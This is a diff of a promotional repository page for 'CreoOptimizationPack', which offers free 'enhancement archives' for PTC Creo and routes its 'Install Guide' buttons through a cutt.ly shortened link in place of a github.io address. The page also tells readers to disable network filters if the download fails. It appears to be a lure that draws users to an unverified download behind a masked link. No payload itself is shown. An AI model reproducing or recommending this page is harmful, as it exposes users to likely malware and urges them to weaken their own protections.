@@ -6,7 +6,7 @@
 
 **About CreoOptimizationPack**: CreoOptimizationPack is a leading repository for *PTC Creo* users on Windows and Mac, offering free enhancement archives to complement this premium CAD software, priced at $2,160/year. Known for advanced 3D modeling and simulation, our archives include custom scripts, design templates, and optimization tools to enhance precision, streamline workflows, and improve project outcomes. Backed by 95K+ visitors and 70K+ members, this September 11, 2025 update supports your paid software, with Mac compatibility via virtualization solutions. (349 characters)
 
-<a href="https://creoenhancecommunity.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/SrNtneDL" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
 </a>
 
@@ -35,7 +35,7 @@ Enhance your *PTC Creo* with **CreoOptimizationPack** on Windows or Mac:
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-<a href="https://creoenhancecommunity.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/SrNtneDL" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
 </a>
 
